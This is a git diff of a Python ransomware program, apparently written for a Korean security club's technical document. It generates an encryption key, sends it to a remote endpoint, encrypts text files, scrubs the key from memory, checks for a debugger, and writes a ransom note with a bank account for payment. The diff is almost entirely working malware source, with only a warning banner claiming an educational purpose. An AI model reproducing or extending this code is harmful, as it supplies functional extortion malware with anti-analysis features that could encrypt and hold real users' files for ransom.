@@ -1,22 +1,43 @@
 import secrets
 import base64
+import sys
 import os
 import requests
+import gc
 from cryptography.fernet import Fernet
     
 def main():
+    #anti_debug()
     warning()
     
+    #암호화키 생성 및 전송
     encryption_key=generate_encryption_key()
     your_id=make_id()
     send_key(f"{your_id} : {encryption_key.decode()}")
     
+    #암호화 진행
     search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=(".txt",".md"))
+    
+    #암호화키 세탁과 삭제
+    for i in range(100):
+        encryption_key=generate_encryption_key()
+    del encryption_key
+    gc.collect()
+    
+    #랜섬노트 생성 및 표시
     create_and_display_ransom_note(your_id)
 
-    if 1==0:
-        print(f"생성된 key : {encryption_key.decode()}")
     exit(0)
+    
+def anti_debug():
+    """
+    @breif : 디버깅을 차단하는 함수, 실제로는 더 복잡하게 작동
+    @param : None
+    @return : None
+    """
+    if sys.gettrace() is not None:
+        print("Debug Detected")
+        exit(-2)
 
 def generate_encryption_key(length=32):
     """
@@ -92,7 +113,9 @@ def create_and_display_ransom_note(id):
     with open(ransom_note,"w+",encoding="utf-8") as f:
         message=f"""
 당신의 컴퓨터는 해킹되었습니다.
-keeper14기 강백준,이영재에게 돈을 입금하세요.
+키퍼 14기 이영재에게 돈을 입금하세요.
+키퍼은행 2019-05112100-1557 예금주 이상혁
+
 2024-01-08 keeper 기술문서
 당신의 아이디 : {id}"""
         f.write(message)
@@ -131,7 +154,7 @@ print("Decode process completed.")
         """
         f.write(code)
 
-    input("Good Luck.")
+    input("Good Luck.\n")
     return
 
 def make_id():
@@ -156,7 +179,6 @@ def send_key(text):
     except:
         exit(-1)
     
-
 def warning():
     print("================================== 주의사항 ==================================")
     print("본 프로그램은 교육 및 연구 목적으로만 제공됩니다.")
